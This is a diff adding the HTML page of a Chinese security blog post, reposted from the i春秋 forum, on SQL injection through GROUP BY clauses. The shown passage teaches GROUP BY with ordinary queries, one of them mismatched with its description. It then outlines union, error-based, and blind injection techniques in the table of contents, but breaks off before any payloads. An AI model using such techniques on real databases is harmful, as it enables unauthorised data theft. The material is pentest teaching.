@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>018-SQL注入之GroupBy位置点注入 - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="description" content="本篇文章作者Xavier，本文属i春秋原创奖励计划，首发于i春秋论坛，未经许可禁止转载。
+原文地址：https://bbs.ichunqiu.com/thread-63490-1-1.html
+"><meta name="keywords" content='SQLi'>
+  <meta itemprop="name" content="018-SQL注入之GroupBy位置点注入">
+  <meta itemprop="description" content="本篇文章作者Xavier，本文属i春秋原创奖励计划，首发于i春秋论坛，未经许可禁止转载。
+原文地址：https://bbs.ichunqiu.com/thread-63490-1-1.html">
+  <meta itemprop="datePublished" content="2023-07-27T09:30:40+08:00">
+  <meta itemprop="dateModified" content="2023-07-27T09:30:40+08:00">
+  <meta itemprop="wordCount" content="3973">
+  <meta itemprop="keywords" content="SQLi"><meta property="og:url" content="http://localhost:1313/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/">
+  <meta property="og:site_name" content="Xavier&#39;s Blog">
+  <meta property="og:title" content="018-SQL注入之GroupBy位置点注入">
+  <meta property="og:description" content="本篇文章作者Xavier，本文属i春秋原创奖励计划，首发于i春秋论坛，未经许可禁止转载。
+原文地址：https://bbs.ichunqiu.com/thread-63490-1-1.html">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-07-27T09:30:40+08:00">
+    <meta property="article:modified_time" content="2023-07-27T09:30:40+08:00">
+    <meta property="article:tag" content="SQLi">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="018-SQL注入之GroupBy位置点注入">
+  <meta name="twitter:description" content="本篇文章作者Xavier，本文属i春秋原创奖励计划，首发于i春秋论坛，未经许可禁止转载。
+原文地址：https://bbs.ichunqiu.com/thread-63490-1-1.html">
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/" title="018-SQL注入之GroupBy位置点注入 - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/tools/" title="Tools" /><link rel="next" type="text/html" href="http://localhost:1313/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/" title="019-SQL注入之OrderBy位置点注入" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/index.md" title="018-SQL注入之GroupBy位置点注入 - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "018-SQL注入之GroupBy位置点注入",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5\/"
+    },"genre": "posts","keywords": "SQLi","wordcount":  3973 ,
+    "url": "http:\/\/localhost:1313\/posts\/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5\/","datePublished": "2023-07-27T09:30:40+08:00","dateModified": "2023-07-27T09:30:40+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>018-SQL注入之GroupBy位置点注入</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/pentest/" class="post-category" title="分类 - Pentest"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pentest</a></span></div><div class="post-meta-line"><span title="发布于 2023-07-27 09:30:40"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2023-07-27">2023-07-27</time></span>&nbsp;<span title="3973 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 4000 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 8 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#group-by-简介">Group by 简介</a>
+      <ul>
+        <li><a href="#group-by-语法">GROUP BY 语法</a></li>
+        <li><a href="#使用场景">使用场景</a>
+          <ul>
+            <li><a href="#1查询每个顾客的订单总额">1）查询每个顾客的订单总额</a></li>
+            <li><a href="#2统计员工数量最多的5个部门">2）统计员工数量最多的5个部门</a></li>
+            <li><a href="#3统计不同部门的员工总数和平均薪资">3）统计不同部门的员工总数和平均薪资</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#group-by-注入">GROUP BY 注入</a>
+      <ul>
+        <li><a href="#案例">案例</a></li>
+        <li><a href="#本地环境">本地环境</a></li>
+        <li><a href="#获取字段数">获取字段数</a></li>
+        <li><a href="#联合查询">联合查询</a></li>
+        <li><a href="#报错注入">报错注入</a>
+          <ul>
+            <li><a href="#xpath报错">XPath报错</a></li>
+            <li><a href="#geohash报错">Geohash报错</a></li>
+            <li><a href="#gtid报错">GTID报错</a></li>
+          </ul>
+        </li>
+        <li><a href="#布尔盲注">布尔盲注</a></li>
+        <li><a href="#时间盲注">时间盲注</a></li>
+      </ul>
+    </li>
+    <li><a href="#总结">总结</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><p>本篇文章作者Xavier，本文属i春秋原创奖励计划，首发于i春秋论坛，未经许可禁止转载。</p>
+<p>原文地址：https://bbs.ichunqiu.com/thread-63490-1-1.html</p>
+<h2 id="group-by-简介" class="heading-element"><span>Group by 简介</span>
+  <a href="#group-by-%e7%ae%80%e4%bb%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><code>GROUP BY</code> 语句将具有相同值的行分组为汇总行，例如&quot;查找每个地区的客户数量&quot;。</p>
+<p><code>GROUP BY</code> 语句通常与聚合函数（<code>COUNT()</code>、<code>MAX()</code>, <code>MIN()</code>, <code>SUM()</code>, <code>AVG()</code>) 按一列或多列对结果集进行分组。</p>
+<h3 id="group-by-语法" class="heading-element"><span>GROUP BY 语法</span>
+  <a href="#group-by-%e8%af%ad%e6%b3%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="k">column_name</span><span class="p">,</span><span class="w"> </span><span class="k">function</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">WHERE</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">operator</span><span class="w"> </span><span class="n">value</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="k">column_name</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">HAVING</span><span class="w"> </span><span class="n">condition</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="k">column_name</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">LIMIT</span><span class="w"> </span><span class="n">num</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>GROUP BY</code>子句中，列出了要用于分组的列名。查询结果将根据这些列的值进行分组，具有相同值的行将被归为一组。然后，对于每个组，可以使用聚合函数来计算汇总值。</p>
+<h3 id="使用场景" class="heading-element"><span>使用场景</span>
+  <a href="#%e4%bd%bf%e7%94%a8%e5%9c%ba%e6%99%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="1查询每个顾客的订单总额" class="heading-element"><span>1）查询每个顾客的订单总额</span>
+  <a href="#1%e6%9f%a5%e8%af%a2%e6%af%8f%e4%b8%aa%e9%a1%be%e5%ae%a2%e7%9a%84%e8%ae%a2%e5%8d%95%e6%80%bb%e9%a2%9d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>例如，假设有一个<code>Orders</code>表包含以下列：<code>OrderID</code>、<code>CustomerID</code>、<code>OrderDate</code>和<code>TotalAmount</code>。我们可以使用<code>GROUP BY</code>语句按<code>CustomerID</code>对订单进行分组，并计算每个客户的订单总金额：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">CustomerID</span><span class="p">,</span><span class="w"> </span><span class="k">SUM</span><span class="p">(</span><span class="n">TotalAmount</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">TotalSum</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">FROM</span><span class="w"> </span><span class="n">Orders</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">CustomerID</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>以上查询将返回每个客户的<code>CustomerID</code>和对应的订单总金额<code>TotalSum</code>。</p>
+<p>需要注意的是，使用<code>GROUP BY</code>语句时，<code>SELECT</code>子句中的列必须是分组列或聚合函数的结果列。如果在<code>SELECT</code>子句中引用了其他列，则这些列必须在<code>GROUP BY</code>子句中列出。</p>
+<p><code>GROUP BY</code>语句可以用于多个列的组合分组，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">CustomerID</span><span class="p">,</span><span class="w"> </span><span class="k">SUM</span><span class="p">(</span><span class="n">TotalAmount</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">TotalSum</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">FROM</span><span class="w"> </span><span class="n">Orders</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">CustomerID</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>以上查询将按<code>Country</code>和<code>City</code>两列进行分组，并计算每个组的记录数。</p>
+<p>总之，<code>GROUP BY</code>语句在SQL中用于按照指定的列对结果进行分组，并进行聚合计算，以便更好地理解和分析数据。</p>
+<h4 id="2统计员工数量最多的5个部门" class="heading-element"><span>2）统计员工数量最多的5个部门</span>
+  <a href="#2%e7%bb%9f%e8%ae%a1%e5%91%98%e5%b7%a5%e6%95%b0%e9%87%8f%e6%9c%80%e5%a4%9a%e7%9a%845%e4%b8%aa%e9%83%a8%e9%97%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>统计每个部门的员工数量，并按照员工数量降序排序，只返回前5个部门：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">department</span><span class="p">,</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">total_employees</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">FROM</span><span class="w"> </span><span class="n">employees</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">department</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">total_employees</span><span class="w"> </span><span class="k">DESC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">5</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="3统计不同部门的员工总数和平均薪资" class="heading-element"><span>3）统计不同部门的员工总数和平均薪资</span>
+  <a href="#3%e7%bb%9f%e8%ae%a1%e4%b8%8d%e5%90%8c%e9%83%a8%e9%97%a8%e7%9a%84%e5%91%98%e5%b7%a5%e6%80%bb%e6%95%b0%e5%92%8c%e5%b9%b3%e5%9d%87%e8%96%aa%e8%b5%84" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>查询不同部门的员工总数和平均工资，并将结果合并：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">department</span><span class="p">,</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">total_employees</span><span class="p">,</span><span class="w"> </span><span class="k">AVG</span><span class="p">(</span><span class="n">salary</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">avg_salary</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">FROM</span><span class="w"> </span><span class="n">employees</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">department</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;Overall&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="w"> </span><span class="k">AVG</span><span class="p">(</span><span class="n">salary</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">FROM</span><span class="w"> </span><span class="n">employees</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="group-by-注入" class="heading-element"><span>GROUP BY 注入</span>
+  <a href="#group-by-%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>上面给了几个group by的使用场景，<code>GROUP BY</code>子句后面的参数是用于指定列名或表达式，以对结果进行分组。这些参数通常是SQL查询的一部分，与order by 一样，无法直接预编译，因此也容易出现SQL注入。</p>
+<p>只不过相比于order by位置点的注入，group by位置点更少见一些。</p>
+<h3 id="案例" class="heading-element"><span>案例</span>
+  <a href="#%e6%a1%88%e4%be%8b" class="heading-mark">
